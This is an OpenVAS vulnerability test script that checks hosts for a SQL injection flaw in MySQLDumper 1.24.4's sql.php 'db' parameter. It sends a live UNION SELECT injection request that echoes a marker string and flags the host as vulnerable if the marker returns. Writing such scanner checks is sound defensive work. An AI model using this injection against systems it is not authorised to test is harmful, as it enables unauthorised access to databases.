##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mysqldumper_sql_inj_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# MySQLDumper SQL Injection Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mysqldumper:mysqldumper";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903211");
  script_version("$Revision: 11401 $");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-05-29 12:55:13 +0530 (Wed, 29 May 2013)");
  script_name("MySQLDumper SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.1337day.com/exploit/17551");
  script_xref(name:"URL", value:"http://fuzzexp.org/exp/exploits.php?id=95");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_dependencies("sw_mysqldumper_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mysqldumper/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may leads to access
  or modify data in the underlying database.");
  script_tag(name:"affected", value:"MySQLDumper version 1.24.4");
  script_tag(name:"insight", value:"The flaw is due to improper validation of input passed via the
  'db' parameter in sql.php script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running MySQLDumper and is prone to SQL injection
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/sql.php?db=-'%20union%20select%201,2," +
            "'OpenVAS-SQL-Injection-Test'%20from%20tblusers%20where%20'1";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"openvas-sql-injection-test",
                     extra_check: make_list( "Database", "Table View" ) ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );